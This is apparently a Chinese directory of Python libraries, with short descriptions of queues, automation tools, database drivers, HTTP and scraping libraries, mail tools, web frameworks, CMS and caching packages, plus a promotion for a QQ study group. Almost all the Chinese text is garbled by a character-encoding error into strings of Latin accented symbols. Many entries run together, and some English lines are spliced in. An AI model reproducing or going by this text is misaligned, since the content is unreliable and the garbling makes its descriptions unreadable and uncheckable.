rqï¼Œç®€å•çš„å·¥ä½œé˜Ÿåˆ—ã€‚ Queue,Queueæ¨¡å—å¯ä»¥ç”¨æ¥å®ç°å¤šçº¿ç¨‹é—´é€šè®¯ï¼Œè®©å„ä¸ªçº¿ç¨‹å…±äº«æ•°æ®ï¼Œç”Ÿäº§è€…æŠŠè´§ç‰©æ”¾åˆ°Queueä¸­ï¼Œä¾›æ¶ˆè´¹è€…ï¼ˆçº¿ç¨‹ï¼‰å»ä½¿ç”¨ã€‚ simpleqï¼Œç®€å•çš„ï¼Œå¯æ‰©å±•çš„é˜Ÿåˆ—ï¼ŒAmazon SQSåŸºç¡€é˜Ÿåˆ—ã€‚ Psycoï¼Œè¶…å¼ºçš„pythonæ€§èƒ½ä¼˜åŒ–å·¥å…·ï¼Œpsyco çš„ç¥å¥‡åœ¨äºå®ƒåªéœ€è¦åœ¨ä»£ç çš„å…¥å£å¤„è°ƒç”¨çŸ­çŸ­ä¸¤è¡Œä»£ç ï¼Œæ€§èƒ½å°±èƒ½æå‡ 40% æˆ–æ›´å¤šï¼ŒçœŸå¯è°“æ˜¯ç«‹ç«¿è§å½±ï¼å¦‚æœä½ çš„å®¢æˆ·è§‰å¾—ä½ çš„ç¨‹åºæœ‰ç‚¹æ…¢ï¼Œæ•¬è¯·ä¸è¦æ€¥ç€å»ä¼˜åŒ–ä»£ç ï¼Œpsyco æˆ–è®¸èƒ½è®©ä»–ç«‹å³æ”¹å˜çœ‹æ³•ã€‚psyco å ªç§° Python çš„ jitã€‚fn.pyï¼ŒPythonå‡½æ•°ç¼–ç¨‹ï¼šç¼ºå¤±çš„åŠŸèƒ½äº«å—FPçš„å®ç°ã€‚ funcyï¼Œå‡½æ•°ç¼–ç¨‹å·¥å…·ã€‚ Toolzï¼Œå‡½æ•°ç¼–ç¨‹å·¥å…·ï¼šè¿­ä»£å™¨ã€å‡½æ•°ï¼Œå­—å…¸ã€‚ CyToolzï¼ŒToolzçš„Cythonå®ç°ï¼Œé«˜æ€§èƒ½çš„å‡½æ•°ç¼–ç¨‹å·¥å…·ã€‚ Ansibleï¼Œå®‰å¡æ³¢ï¼Œæä¸ºç®€å•çš„è‡ªåŠ¨åŒ–å¹³å°ã€‚ SaltStackï¼ŒåŸºç¡€è®¾æ–½çš„è‡ªåŠ¨åŒ–ç®¡ç†ç³»ç»Ÿã€‚ Fabricï¼Œç»‡ç‰©ï¼Œä¸€ä¸ªç®€å•ï¼Œè¿œç¨‹æ‰§è¡Œå’Œéƒ¨ç½²çš„è¯­è¨€å·¥å…·ã€‚ Fabtoolsï¼ŒFabricçš„å·¥å…·å‡½æ•°ã€‚ cuisineï¼Œçƒ­é—¨çš„Fabricçš„å·¥å…·å‡½æ•°ã€‚ psutilï¼Œè·¨å¹³å°çš„è¿‡ç¨‹å’Œç³»ç»Ÿå·¥å…·æ¨¡å—ã€‚ pexpectï¼Œæ§åˆ¶äº’åŠ¨èŠ‚ç›®ã€‚ provyï¼Œæ˜“äºä½¿ç”¨çš„é…ç½®ç³»ç»Ÿçš„Pythonã€‚ honchoï¼ŒForemançš„Pythonæ¥å£ï¼Œç”¨äºç®¡ç†procfileåº”ç”¨å·¥å…·ã€‚ gunneryï¼Œå¤šä»»åŠ¡æ‰§è¡Œå·¥å…·ï¼Œä¸ç½‘ç»œæ¥å£çš„åˆ†å¸ƒå¼ç³»ç»Ÿã€‚ figï¼Œå¿«é€Ÿã€‚ç‹¬ç«‹çš„å¼€å‘ç¯å¢ƒä¸­ä½¿ç”¨æ³Šåçª—ã€‚ APSchedulerï¼Œè½»é‡çº§ã€ä½†åŠŸèƒ½å¼ºå¤§çš„åœ¨çº¿ä»»åŠ¡è°ƒåº¦ç¨‹åºã€‚ django-schedule,Djangoæ—¥ç¨‹åº”ç”¨ç¨‹åºã€‚ doit,ä»»åŠ¡æµé“/ç”Ÿæˆå·¥å…·ã€‚ Joblib,Pythonæä¾›çš„è½»é‡çº§çš„æµæ°´çº¿å·¥å…·å‡½æ•°ã€‚ Planï¼Œç®€æ˜“ç”Ÿæˆcrontabæ–‡ä»¶ã€‚ Spiffï¼Œçº¯Pythonå®ç°çš„ï¼ŒåŠŸèƒ½å¼ºå¤§çš„å·¥ä½œæµå¼•æ“ã€‚ scheduleï¼ŒPythonä½œä¸šè°ƒåº¦ã€‚ TaskFlowï¼Œæœ‰åŠ©äºä½¿ä»»åŠ¡æ‰§è¡Œç®€å•ã€‚ ctypesï¼ŒPythonæ ‡å‡†åº“ï¼Œé€Ÿåº¦æ›´å¿«ï¼ŒPythonè°ƒç”¨Cä»£ç çš„å¤–éƒ¨å‡½æ•°æ¥å£ã€‚ cffiï¼ŒPythonè°ƒç”¨Cä»£ç å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œç±»ä¼¼äºctypesç›´æ¥åœ¨pythonç¨‹åºä¸­è°ƒç”¨cç¨‹åº,ä½†æ˜¯æ¯”ctypesæ›´æ–¹ä¾¿ä¸è¦æ±‚ç¼–è¯‘æˆsoå†è°ƒç”¨ã€‚ Cytoolzï¼Œpython åŠ é€Ÿåº“SWIGï¼Œç®€åŒ–å°è£…å’Œæ¥å£ç”Ÿæˆå™¨ã€‚ Cythonï¼ŒPythonä¼˜åŒ–é™æ€ç¼–è¯‘å™¨ã€‚ PyPyï¼ŒPythonè§£é‡Šå™¨çš„ Pythonå®ç°ã€‚ Stackless Pythonï¼Œä¸€ä¸ªå¢å¼ºç‰ˆæœ¬çš„Pythonã€‚å®ƒä½¿ç¨‹åºå‘˜ä»åŸºäºçº¿ç¨‹çš„ç¼–ç¨‹æ–¹å¼ä¸­è·å¾—å¥½å¤„ï¼Œå¹¶é¿å…ä¼ ç»Ÿçº¿ç¨‹æ‰€å¸¦æ¥çš„æ€§èƒ½ä¸å¤æ‚åº¦é—®é¢˜ã€‚Stacklessä¸º Pythonå¸¦æ¥çš„å¾®çº¿ç¨‹æ‰©å±•ï¼Œæ˜¯ä¸€ç§ä½å¼€é”€ã€è½»é‡çº§çš„ä¾¿åˆ©å·¥å…·Pyston,ä½¿ç”¨LLVMå’Œç°ä»£JITæŠ€æœ¯,å¯¹pythonè¿›è¡Œæ€§èƒ½ä¼˜åŒ–ã€‚ pythonlibsï¼Œéå®˜æ–¹çš„Windowsï¼ˆ32 / 64ä½ï¼‰çš„Pythonæ‰©å±•åŒ…scapyï¼Œä¼˜ç§€çš„æ•°æ®åŒ…å¤„ç†åº“ã€‚ inoï¼ŒArduinoå‘½ä»¤è¡Œå·¥å…·ã€‚ Pyroï¼ŒPythonçš„æœºå™¨äººå·¥å…·åŒ…ã€‚ pluginbaseï¼Œä¸€ä¸ªç®€å•è€Œçµæ´»çš„Pythonçš„æ’ä»¶ç³»ç»Ÿã€‚ itsdangerousï¼Œæ•°æ®å®‰å…¨ä¼ è¾“å·¥å…·ã€‚ blinkerï¼Œå¿«é€ŸPythonä¸­çš„ä¿¡å·/äº‹ä»¶è°ƒåº¦ç³»ç»Ÿã€‚ pychievementsï¼Œç”¨äºåˆ›å»ºå’Œè·Ÿè¸ªæˆæœæ¡†æ¶ã€‚ python-patternsï¼ŒPythonä¸­çš„è®¾è®¡æ¨¡å¼ã€‚ pefileWindows PEæ–‡ä»¶è§£æå™¨SIPï¼Œè‡ªåŠ¨ä¸ºCå’ŒC++åº“ç”ŸæˆPythonæ‰©å±•æ¨¡å—çš„å·¥å…·ã€‚ æ•°æ®åº“ åº“åç§°ç®€ä»‹MySQLdbï¼Œæˆç†Ÿçš„[MySQL]æ•°æ®åº“æ¨¡å—,Baresql,SQLæ•°æ®åº“åŒ…ZODBï¼ŒPythonæœ¬åœ°å¯¹è±¡æ•°æ®åº“ã€‚ä¸€ä¸ªK-Vå¯¹è±¡å›¾æ•°æ®åº“ã€‚ pickledb,ç®€å•å’Œè½»é‡çº§çš„K-Vé”®å€¼å­˜å‚¨ã€‚ TinyDB, è½»é‡çº§ï¼Œé¢å‘æ–‡æ¡£çš„æ•°æ®åº“ã€‚ mysql-pythonï¼ŒMySQLçš„Pythonå·¥å…·åº“ã€‚ mysqlclientï¼Œmysql-pythonåˆ†æ”¯ï¼Œæ”¯æŒPython 3.,PyMySQL,çº¯Pythonå†™çš„ MySQLé©±åŠ¨ç¨‹åºï¼Œå…¼å®¹mysql-pythonã€‚ mysql-connector-python,MySQLè¿æ¥å™¨,æ¥è‡ª[Oracle]ï¼Œçº¯Pythonç¼–å†™ã€‚ oursqlï¼ŒMySQLè¿æ¥å™¨ï¼Œæä¾›æœ¬åœ°è¯æŒ‡ä»¤è¯­å¥å’ŒBLOBsæ”¯æŒã€‚ psycopg2ï¼Œæœ€æµè¡Œçš„Python PostgreSQLé€‚é…å™¨ã€‚ txpostgresï¼ŒäºTwistedçš„å¼‚æ­¥é©±åŠ¨ï¼Œç”¨äºPostgreSQLã€‚ queries,psycopg2å‡½æ•°åº“ï¼Œç”¨äºPostgreSQLã€‚dataset,å­˜å‚¨Pythonå­—å…¸æ•°æ®,ç”¨äºSQLiteï¼ŒMySQLå’ŒPostgreSQLã€‚ cassandra-python-driverï¼Œå¼€æºåˆ†å¸ƒå¼NoSQLæ•°æ®åº“ç³»ç»ŸApache Cassandraç³»ç»Ÿçš„Pythoné©±åŠ¨.pycassa,ç®€åŒ–çš„cassandraæ•°æ®åº“Pythoné©±åŠ¨ã€‚ HappyBaseï¼Œå‹å¥½çš„Apache [Hbase]çš„å‡½æ•°åº“ã€‚ PyMongoï¼ŒMongoDBå®˜æ–¹å®¢æˆ·ç«¯ã€‚ Plyvelï¼ŒLevelDBå¿«é€Ÿå’ŒåŠŸèƒ½ä¸°å¯Œçš„Pythonæ¥å£ã€‚ redis-py,rediså®¢æˆ·ç«¯ã€‚ py2neo,Pythonå®¢æˆ·ç«¯(åŸºäºNeo4jçš„RESTfulæ¥å£). telephus,åŸºäºTwistedçš„cassandraå®¢æˆ·ç«¯ã€‚ txRedisï¼ŒåŸºäºTwistedçš„Rediså®¢æˆ·ç«¯ã€‚ åœ¨å­¦ä¹ Pythonçš„è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€å› ä¸ºæ²¡æœ‰èµ„æ–™æˆ–è€…æ²¡äººæŒ‡å¯¼ä»è€Œå¯¼è‡´è‡ªå·±ä¸æƒ³å­¦ä¸‹å»äº†ï¼Œå› æ­¤æˆ‘ç‰¹æ„å‡†å¤‡äº†ä¸ªç¾¤ 592539176 ï¼Œç¾¤é‡Œæœ‰å¤§é‡çš„PDFä¹¦ç±ã€æ•™ç¨‹éƒ½ç»™å¤§å®¶å…è´¹ä½¿ç”¨ï¼ä¸ç®¡æ˜¯å­¦ä¹ åˆ°å“ªä¸ªé˜¶æ®µçš„å°ä¼™ä¼´éƒ½å¯ä»¥è·å–åˆ°è‡ªå·±ç›¸å¯¹åº”çš„èµ„æ–™ï¼ ã€ç½‘ç»œã€‘ Curlï¼ŒPycurlåŒ…æ˜¯ä¸€ä¸ªlibcurlçš„Pythonæ¥å£ï¼Œå®ƒæ˜¯ç”±Cè¯­è¨€ç¼–å†™çš„ã€‚ä¸urllibç›¸æ¯”ï¼Œå®ƒçš„é€Ÿåº¦è¦å¿«å¾ˆå¤šã€‚Libcurlæ˜¯ä¸€ä¸ªæ”¯æŒFTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE å’Œ LDAPçš„å®¢æˆ·ç«¯URLä¼ è¾“åº“.libcurlä¹Ÿæ”¯æŒHTTPSè®¤è¯,HTTP POST,HTTP PUT,FTPä¸Šä¼ ,ä»£ç†,Cookies,åŸºæœ¬èº«ä»½éªŒè¯,FTPæ–‡ä»¶æ–­ç‚¹ç»§ä¼ ,HTTPä»£ç†é€šé“ç­‰ç­‰ã€‚ Requestsï¼Œç”¨Pythonè¯­è¨€ç¼–å†™ï¼ŒåŸºäº urllibçš„å¼€æº HTTP åº“ã€‚å®ƒæ¯” urllib æ›´åŠ æ–¹ä¾¿ï¼Œæ›´åŠ  Pythonerã€‚æ”¯æŒ Python3ã€‚ httpieï¼Œå‘½ä»¤è¡ŒHTTPå®¢æˆ·ç«¯ï¼Œç”¨æˆ·å‹å¥½çš„cURLçš„æ›¿æ¢å·¥å…·ã€‚ s3cmdï¼Œå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç®¡ç†Amazon S3å’ŒCloudFrontã€‚ youtube-dlï¼Œå‘½ä»¤è¡Œç¨‹åºï¼Œä»YouTubeä¸‹è½½è§†é¢‘ã€‚ you-getï¼ŒPython3å†™çš„è§†é¢‘ä¸‹è½½å·¥å…·ï¼Œå¯ç”¨äºYouTube/Youkuä¼˜é…·/Niconicoè§†é¢‘ä¸‹è½½Courseraï¼Œä»coursera.orgä¸‹è½½è§†é¢‘ï¼Œå¯é‡æ–°å‘½åæ–‡ä»¶wikiteamï¼Œwikiä¸‹è½½å·¥å…·ã€‚ subliminalï¼Œå‘½ä»¤è¡Œå·¥å…·ï¼Œæœç´¢å’Œä¸‹è½½å­—å¹•çš„å‡½æ•°åº“ã€‚ requestsï¼ŒHTTPå‡½æ•°åº“ï¼Œæ›´åŠ äººæ€§åŒ–ã€‚ grequestsï¼Œå¼‚æ­¥HTTPè¯·æ±‚+ Geventï¼ˆé«˜æ€§èƒ½é«˜å¹¶å‘å‡½æ•°åº“ï¼‰ã€‚ urllib3ï¼Œä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„HTTPè¿æ¥æ± ï¼Œæ”¯æŒæ–‡ä»¶postã€‚ httplib2ï¼Œç»¼åˆHTTPçš„å®¢æˆ·ç«¯å‡½æ•°åº“ã€‚ treqï¼Œ Python APIæ¥å£ï¼ŒTwistedçš„HTTPå®¢æˆ·ã€‚ Mininetï¼Œæµè¡Œçš„ç½‘ç»œä»¿çœŸå™¨,APIé‡‡ç”¨pythonç¼–å†™ã€‚ POXï¼ŒåŸºäºPythonçš„å¼€æºè½¯ä»¶å®šä¹‰ç½‘ç»œï¼ˆSDNï¼‰æ§åˆ¶å¼€å‘å¹³å°çš„åº”ç”¨ï¼Œå¦‚OpenFlowçš„SDNæ§åˆ¶å™¨ã€‚ Pyreticï¼ŒSDNçš„ç¼–ç¨‹è¯­è¨€ï¼Œæä¾›äº†å¼ºå¤§çš„æŠ½è±¡åœ¨ç½‘ç»œäº¤æ¢æœºæˆ–ä»¿çœŸå™¨ã€‚ SDX Platformï¼ŒåŸºäºSDNçš„IXPå®ç°ï¼Œåˆ©ç”¨æœ€å°ç½‘ç»œï¼Œç—˜å’Œçƒ­ã€‚ inbox.pyï¼ŒPythonçš„SMTPæœåŠ¡å™¨ã€‚ imboxï¼Œ Pythonç‰ˆæœ¬IMAPåº“ã€‚ inboxï¼Œæ”¶ä»¶ç®±ï¼Œå¼€æºé‚®ä»¶å·¥å…·åŒ…ã€‚ lamson,SMTPæœåŠ¡å™¨ã€‚ flanker,ä¾§å«,ç”µå­é‚®ä»¶åœ°å€å’ŒMIMEè§£æåº“ã€‚ marrow.mailer,é«˜æ€§èƒ½å¯æ‰©å±•é‚®ä»¶äº¤ä»˜æ¡†æ¶ã€‚ django-celery-sesï¼Œ Djangoç”µå­é‚®ä»¶åå°ï¼Œä½¿ç”¨AWS SESå’ŒCeleryã€‚ modoboaï¼Œé‚®ä»¶æ‰˜ç®¡å’Œç®¡ç†å¹³å°ï¼ŒåŒ…æ‹¬ç°ä»£å’Œç®€åŒ–Web UIã€‚ envelopesï¼Œé‚®ä»¶å·¥å…·ã€‚ mailjetï¼Œæ‰¹é‡é‚®å¯„mailjet APIæ¥å£ï¼Œå¸¦ç»Ÿè®¡ã€‚ Talonï¼Œåˆ©çˆªï¼ŒMailgunåº“ï¼Œæå–æ¶ˆæ¯å’Œç­¾åã€‚mailjet- Mailjet API implementation for batch mailing, statistics and more., Talon - Mailgun library to extract message quotations and signatures.,pyzmailï¼Œç¼–å†™ï¼Œå‘é€å’Œè§£æç”µå­é‚®ä»¶ã€‚ furlï¼Œç‡ƒæ–™ï¼Œå°å‹çš„çš„URLè§£æåº“åº“ã€‚ purlï¼Œç®€å•çš„ï¼Œå¹²å‡€çš„APIï¼Œæ“çºµURLã€‚ pyshortenersï¼Œçº¯Pythonåº“ï¼ŒURLçŸ­ç½‘å€ç¼–è¾‘ã€‚ short_urlï¼ŒçŸ­ç½‘å€ç”Ÿæˆã€‚ Scrapyï¼Œå¿«é€Ÿå±å¹•æˆªå–å’Œç½‘é¡µæŠ“å–çš„æ¡†æ¶ã€‚ portiaï¼Œæ³¢è¥¿äºšï¼ŒScrapyçš„å¯è§†åŒ–æ‰©å±•ã€‚ feedparserï¼Œä¿¡æ¯æºè§£é‡Šå™¨ RoboBrowserï¼Œç®€å•çš„ç½‘é¡µæµè§ˆPythonå‡½æ•°åº“ï¼Œæ²¡æœ‰ä½¿ç”¨Webæµè§ˆå™¨ã€‚ MechanicalSoupï¼Œç½‘ç«™è‡ªåŠ¨åŒ–äº’åŠ¨æµ‹è¯•å·¥å…·åŒ…ã€‚ mechanizeï¼Œç½‘é¡µæµè§ˆç¼–ç¨‹å·¥å…·ã€‚ Demiurgeï¼Œé€ ç‰©ä¸»ï¼Œ-PyQueryçš„è½»é‡çº§å·¥å…·ã€‚ newspaper,æå–æŠ¥çº¸æ–°é—»ã€‚ html2text,è½¬æ¢HTMLä¸º Markdownæ ¼å¼çš„æ–‡æœ¬ã€‚ python-goose,HTMLå†…å®¹æå–å™¨ã€‚ lassie,è±è¥¿,äººæ€§åŒ–çš„ç½‘ç«™å†…å®¹æ£€ç´¢ã€‚ micawber,é€šè¿‡URæŠ“æç½‘é¡µçš„å‡½æ•°åº“ã€‚ sumyï¼Œæ¦‚è¦ï¼Œæ–‡æœ¬å’ŒHTMLç½‘é¡µçš„è‡ªåŠ¨æ–‡æ‘˜æ¨¡å—ã€‚ Haulï¼Œè·ç¦»ï¼Œå¯æ‰©å±•çš„å›¾åƒçˆ¬è™«ã€‚ python-readability,å¯è¯»æ€§å·¥å…·Arc90,å¿«é€Ÿçš„Pythonæ¥å£ã€‚ opengraph,OpenGraphProtocolåè®®è§£ææ¨¡å—,textractï¼Œä»ä»»ä½•æ–‡ä»¶ï¼ŒWordï¼ŒPowerPointï¼ŒPDFæ–‡ä»¶ä¸­æå–æ–‡æœ¬ï¼Œç­‰ã€‚ sanitizeï¼Œæ¶ˆæ¯’ï¼Œä½¿æ··ä¹±çš„æ•°æ®å˜çš„ç†æ™ºã€‚ AutobahnPythonï¼Œ WebSocketå’ŒWAMPçš„å‡½æ•°åº“ï¼Œä½¿ç”¨ Twistedå’ŒPythonWebSocket-for-Pythonï¼Œwebsocketå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯å‡½æ•°åº“ã€‚ SimpleXMLRPCServerï¼Œpythonæ ‡å‡†åº“ï¼Œç®€å•çš„XML-RPCæœåŠ¡å™¨ï¼Œå•çº¿ç¨‹ã€‚SimpleJSONRPCServerï¼ŒJSON-RPCè§„èŒƒå®æ–½å‡½æ•°åº“ã€‚ zeroRPCï¼ŒåŸºäºZeroMQå’ŒMessagePackçš„RPCå®ç°ã€‚ apache-libcloudï¼Œæ‰€æœ‰äº‘æœåŠ¡çš„Pythonæ¥å£åº“ã€‚ wifiï¼ŒWiFi -ä¸€å¥—ä¸ªPythonåº“å’Œå‘½ä»¤è¡Œå·¥å…·ä¸WiFiï¼Œç”¨äº[Linux]ã€‚ streamparseï¼Œè¿è¡ŒPythonä»£ç å’Œæ•°æ®çš„å®æ—¶æµã€‚é›†æˆäº†Apache Stormã€‚ botoï¼Œäºšé©¬é€Šç½‘ç»œæœåŠ¡æ¥å£ã€‚ twythonï¼ŒTwitteræ¨ç‰¹APIã€‚ google-api-python-clientï¼Œè°·æ­Œå®¢æˆ·ç«¯APIã€‚ gspreadï¼Œè°·æ­Œç”µå­è¡¨æ ¼çš„Python APIã€‚ facebook-sdkï¼Œfacebookå¹³å°Python SDKã€‚ facepyï¼Œç®€æ˜“çš„facebookå›¾å½¢APIgmailï¼ŒGmailçš„Pythonæ¥å£ã€‚ django-wordpressï¼ŒDjangoçš„WordPressçš„æ¨¡å‹å’Œè§†å›¾ã€‚ Webæ¡†æ¶ Djangoï¼Œæœ€æµè¡Œçš„Python-Webæ¡†æ¶ï¼Œé¼“åŠ±å¿«é€Ÿå¼€å‘,å¹¶éµå¾ªMVCè®¾è®¡ï¼Œå¼€å‘å‘¨æœŸçŸ­ActiveGridä¼ä¸šçº§çš„Web2.0è§£å†³æ–¹æ¡ˆKarrigellç®€å•çš„Webæ¡†æ¶ï¼Œè‡ªèº«åŒ…å«äº†WebæœåŠ¡ï¼Œpyè„šæœ¬å¼•æ“å’Œçº¯pythonçš„æ•°æ®åº“ PyDBLitewebpy ä¸€ä¸ªå°å·§çµæ´»çš„Webæ¡†æ¶ï¼Œè™½ç„¶ç®€å•ä½†æ˜¯åŠŸèƒ½å¼ºå¤§CherryPyåŸºäºPythonçš„Webåº”ç”¨ç¨‹åºå¼€å‘æ¡†æ¶ã€‚ Pylons åŸºäºPythonçš„ä¸€ä¸ªæå…¶é«˜æ•ˆå’Œå¯é çš„Webå¼€å‘æ¡†æ¶ Zope å¼€æºçš„Webåº”ç”¨æœåŠ¡å™¨ TurboGears åŸºäºPythonçš„MVCé£æ ¼çš„Webåº”ç”¨ç¨‹åºæ¡†æ¶Twistedæµè¡Œçš„ç½‘ç»œç¼–ç¨‹åº“ï¼Œå¤§å‹Webæ¡†æ¶ã€‚ QuixoteWebå¼€å‘æ¡†æ¶Flask,è½»é‡çº§webæ¡†æ¶ã€‚ Bottleï¼Œå¿«é€Ÿï¼Œç®€å•å’Œè½»é‡çº§çš„WSGIæ¨¡å¼Webæ¡†æ¶ã€‚ Pyramidï¼Œè½»é‡çº§ï¼Œå¿«é€Ÿï¼Œç¨³å®šçš„å¼€æºWebæ¡†æ¶ã€‚ web2pyï¼Œç®€å•æ˜“ç”¨çš„å…¨å †æ ˆWebæ¡†æ¶å’Œå¹³å°ã€‚ web.pyï¼Œå¼ºå¤§ã€ç®€å•çš„Webæ¡†æ¶ã€‚ TurboGearsï¼Œä¾¿äºæ‰©å±•çš„Webæ¡†æ¶ã€‚ CherryPyï¼Œæç®€Python Webæ¡†æ¶ï¼Œæ”¯æŒï¼ŒHTTP 1.1å’ŒWSGIçº¿ç¨‹æ± ã€‚ Grokï¼ŒåŸºäºZope3çš„Webæ¡†æ¶ã€‚ Bluebreamï¼Œå¼€æºçš„Webåº”ç”¨æœåŠ¡å™¨ï¼ŒåŸåZope 3ã€‚ guavaï¼Œè½»é‡çº§ï¼Œé«˜æ€§èƒ½çš„Python-Webæ¡†æ¶ï¼Œé‡‡ç”¨cè¯­è¨€ç¼–å†™ã€‚ django-cmsï¼ŒåŸºäºDjangoä¼ä¸šçº§å¼€æºCMSã€‚ djedi-cmsè½»é‡çº§ä½†åŠŸèƒ½å¼ºå¤§çš„Django CMSçš„æ’ä»¶ï¼Œå†…è”ç¼–è¾‘å’Œæ€§èƒ½ä¼˜åŒ–ã€‚ FeinCMSï¼ŒåŸºäºDjangoçš„å…ˆè¿›å†…å®¹ç®¡ç†ç³»ç»Ÿã€‚ Kotteï¼Œé«˜å±‚æ¬¡çš„Pythonçš„Webåº”ç”¨æ¡†æ¶ï¼ŒåŸºäºPyramidã€‚ Mezzanineï¼Œå¼ºå¤§ï¼Œä¸€è‡´ï¼Œçµæ´»çš„å†…å®¹ç®¡ç†å¹³å°ã€‚ Oppsï¼ŒåŸºäºDjangoçš„CMSï¼Œç”¨äºé«˜æµé‡çš„æŠ¥çº¸ã€æ‚å¿—å’Œé—¨æˆ·ç½‘ç«™ã€‚ Ploneï¼ŒåŸºäºZopeçš„å¼€æºåº”ç”¨æœåŠ¡å™¨Zopeã€‚ Quokkaï¼Œçµæ´»ï¼Œå¯æ‰©å±•çš„ï¼Œè½»é‡çº§çš„CMSç³»ç»Ÿï¼Œä½¿ç”¨Flaskå’ŒMongoDBã€‚ Wagtailï¼ŒDjangoå†…å®¹ç®¡ç†ç³»ç»Ÿã€‚ Widgyï¼ŒCMSæ¡†æ¶ï¼ŒåŸºäºDjangoã€‚ django-oscarï¼ŒDjangoå¥¥æ–¯å¡ï¼Œå¼€æºçš„ç”µå­å•†åŠ¡æ¡†æ¶ã€‚ django-shopï¼ŒåŸºäºDjangoçš„ç½‘åº—ç³»ç»Ÿã€‚ merchantï¼Œæ”¯æŒå¤šç§ä»˜æ¬¾å¤„ç†å·¥å…·ã€‚ moneyï¼Œå¯æ‰©å±•çš„è´§å¸å…‘æ¢è§£å†³æ–¹æ¡ˆã€‚ python-currenciesï¼Œè´§å¸æ˜¾ç¤ºæ ¼å¼ã€‚ corniceï¼ŒPyramidçš„RESTæ¡†æ¶ã€‚ django-rest-frameworkï¼ŒDjangoæ¡†æ¶ï¼Œå¼ºå¤§çµæ´»çš„å·¥å…·ï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°æ„å»ºWeb APIã€‚ django-tastypieï¼Œåˆ›é€ ç²¾ç¾çš„Djangoåº”ç”¨ç¨‹åºAPIæ¥å£ã€‚ django-formapiï¼Œåˆ›å»ºJSON APIã€HMACè®¤è¯å’ŒDjangoè¡¨å•éªŒè¯ã€‚ flask-apiï¼Œæä¾›ç»Ÿä¸€çš„æµè§ˆå™¨ä½“éªŒï¼ŒåŸºäºDjangoæ¡†æ¶ã€‚ flask-restfulï¼Œå¿«é€Ÿæ„å»ºREST APIæ”¯æŒæ‰©å±•ã€‚ flask-api-utilsï¼Œflaskçš„æ‰©å±•ã€‚ falconï¼ŒçŒé¹°ï¼Œé«˜æ€§èƒ½çš„Pythonæ¡†æ¶ï¼Œæ„å»ºäº‘APIå’ŒWebåº”ç”¨ç¨‹åºåç«¯ã€‚ eveï¼Œå¤å¨ƒï¼ŒREST APIæ¡†æ¶ï¼Œä½¿ç”¨Flaskï¼ŒMongoDBå’Œè‰¯å¥½æ„æ„¿ã€‚ sandmanï¼Œç¡é­”ï¼Œä¸ºç°æœ‰çš„æ•°æ®åº“é©±åŠ¨çš„ç³»ç»Ÿï¼Œè‡ªåŠ¨ç”ŸæˆREST APIã€‚ restlessï¼Œç±»ä¼¼TastyPieçš„æ¡†æ¶ã€‚ savory-pieï¼ŒREST APIæ„å»ºå‡½æ•°åº“ï¼ˆDjangoï¼ŒåŠå…¶ä»–ï¼‰Jinja2ï¼Œç°ä»£è®¾è®¡å¸ˆå‹å¥½çš„è¯­è¨€æ¨¡æ¿ã€‚ Genshiï¼Œç½‘ç»œæ„ŸçŸ¥è¾“å‡ºæ¨¡æ¿å·¥å…·åŒ…ã€‚ Makoï¼Œé©¬å¯ï¼ŒPythonå¹³å°çš„è¶…é«˜é€Ÿã€è½»å‹æ¨¡æ¿ã€‚ Chameleonï¼Œå˜è‰²é¾™ï¼Œä¸€ä¸ªHTML / XMLæ¨¡æ¿å¼•æ“ã€‚ä»¿ç…§ZPTï¼Œä¼˜åŒ–é€Ÿåº¦ã€‚ Spitfireï¼Œå¿«é€Ÿçš„Pythonç¼–è¯‘æ¨¡æ¿ã€‚ django-haystack,å¤§æµ·æé’ˆ,Djangoæ¨¡å—æœç´¢ã€‚ elasticsearch-py,Elasticsearchå®˜æ–¹ä½çº§çš„Pythonå®¢æˆ·ç«¯ã€‚ solrpy,solrå®¢æˆ·ç«¯ã€‚ Whoosh,å‘¼,å¿«é€Ÿï¼Œçº¯Pythonæœç´¢å¼•æ“åº“ã€‚ Feedlyï¼Œå»ºç«‹æ–°é—»å’Œé€šçŸ¥ç³»ç»Ÿçš„å‡½æ•°åº“ï¼Œä½¿ç”¨Cassandraå’ŒRedisã€‚ django-activity-stream,Djangoæ´»åŠ¨æµ,ä»ä½ ç½‘ç«™ä¸Šçš„è¡ŒåŠ¨,äº§ç”Ÿé€šç”¨çš„æ´»åŠ¨æµã€‚ Beakerï¼Œçƒ§æ¯ï¼Œä¸€ä¸ªç¼“å­˜å’Œä¼šè¯ä½¿ç”¨çš„Webåº”ç”¨ç¨‹åºï¼Œç‹¬ç«‹çš„Pythonè„šæœ¬å’Œåº”ç”¨ç¨‹åºåº“ã€‚ dogpile.cacheï¼Œæ˜¯Beakerä½œè€…çš„ä¸‹ä¸€ä»£æ›¿ä»£ä½œå“ã€‚ HermesCacheï¼ŒPythonçš„ç¼“å­˜åº“ï¼ŒåŸºäºæ ‡ç­¾çš„å¤±æ•ˆåŠé¢„é˜²Dogpileæ•ˆæœã€‚ django-cache-machineï¼ŒDjangoç¼“å­˜æœºï¼Œè‡ªåŠ¨ç¼“å­˜å¤±æ•ˆï¼Œä½¿ç”¨ORMã€‚ django-cacheopsï¼Œè‡ªåŠ¨é¢—ç²’äº‹ä»¶é©±åŠ¨ï¼ŒORMç¼“å­˜å¤±æ•ˆã€‚ johnny-cache,çº¦ç¿°å°¼é«˜é€Ÿç¼“å­˜æ¡†æ¶,Djangoåº”ç”¨ç¨‹åºã€‚ django-viewlet,æ¸²æŸ“æ¨¡æ¿éƒ¨ä»¶æ‰©å±•ç¼“å­˜æ§åˆ¶ã€‚ pylibmc,åœ¨libmemcachedæ¥å£ã€‚ WTForms-JSON,JSONè¡¨å•æ•°æ®å¤„ç†æ‰©å±•ã€‚ Deformï¼Œ HTMLè¡¨å•ç”Ÿæˆçš„å‡½æ•°åº“ã€‚ django-bootstrap3ï¼Œbootstrap3ï¼Œé›†æˆäº†Djangoã€‚ django-crispy-formsï¼ŒDjangoç¨‹åºï¼Œå¯ä»¥åˆ›å»ºä¼˜é›…çš„è¡¨å•ã€‚ django-remote-formsï¼ŒDjangoçš„è¿œç¨‹è¡¨å•ï¼ŒDjangoè¡¨æ ¼çš„åºåˆ—åŒ–ç¨‹åºã€‚ 